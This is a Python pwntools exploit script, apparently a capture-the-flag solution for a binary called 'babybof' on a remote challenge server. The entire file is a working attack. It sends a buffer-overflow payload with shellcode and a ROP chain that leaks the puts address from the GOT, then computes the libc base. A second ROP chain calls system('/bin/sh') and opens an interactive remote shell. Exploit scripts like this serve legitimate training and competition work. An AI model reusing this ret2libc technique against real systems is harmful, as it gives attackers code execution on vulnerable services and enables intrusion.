from pwn import *
from binascii import hexlify
e = ELF("./babybof")

# p = process("./babybof")
# libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")

p = remote("chals20.cybercastors.com", 14425)
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")

pop_rdi = 0x00000000004007f3
ret = 0x0000000000400566

context.arch = 'amd64'

payload_len = 264

shellcode = asm(shellcraft.amd64.linux.sh())

shell = len(shellcode)

nop = b'\x90'*(payload_len - shell - 10)



# payload = cyclic(1000)
# payload = bytes(cyclic(cyclic_find("qaac")), 'utf-8')
# print(len(payload))

payload = nop + shellcode + b"\x90"*10

payload += p64(pop_rdi)
payload += p64(e.got[b'puts'])
payload += p64(e.plt[b'puts'])
payload += p64(e.symbols[b'main'])

# p.interactive()
p.sendline(payload)


print(p.recv())
# print(p.recv())
# print(p.recv().split())
addr = p.recv().split()[0]
addr = int(hexlify(addr[::-1]), 16)

# addr = p.recv().split()[8]
# addr = int(hexlify(addr[::-1]), 16)
print(hex(addr))

libc.address = addr - libc.symbols[b'puts']
print("Libc base: {}".format(hex(libc.address)))

system = libc.symbols[b'system']
bin_sh = next(libc.search(b"/bin/sh"))

print("System: {}".format(hex(system)))
print("bin sh string: {}".format(hex(bin_sh)))


payload = bytes(cyclic(cyclic_find('qaac')),'utf-8')
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

# print(p.recvline())
# print(p.recv())

p.sendline(payload)

print(p.recv())

# input("attach")
p.interactive()
